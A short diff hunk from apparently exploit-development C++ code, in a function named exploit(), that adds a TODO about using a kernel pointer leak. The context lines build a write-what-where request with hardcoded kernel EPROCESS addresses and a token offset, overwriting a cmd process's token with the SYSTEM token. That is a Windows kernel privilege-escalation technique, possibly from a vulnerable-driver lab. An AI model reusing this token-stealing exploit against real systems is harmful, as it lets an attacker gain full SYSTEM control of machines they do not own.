@@ -15,6 +15,7 @@ void exploit()
 	// ffffbe8c004b1080 cmd eprocess (+0x248 for token)
 	// ffffbe8bf96ac040 system eprocess (+0x248 for token)
 	// TODO: use PreExploitation to resolve these pointers via WWW (triggering the opposite way and using for RWW)
+	// TODO: use non-low integrity ntos leak of mine:
 	WriteWhatWhere www = { .What = 0xffffbe8bf96ac040 + 0x248, .Where = 0xffffbe8c004b1080 + 0x248 }; // Change token of owning cmd to system
 	std::memcpy(in_buffer.data(), &www, sizeof(WriteWhatWhere));
 
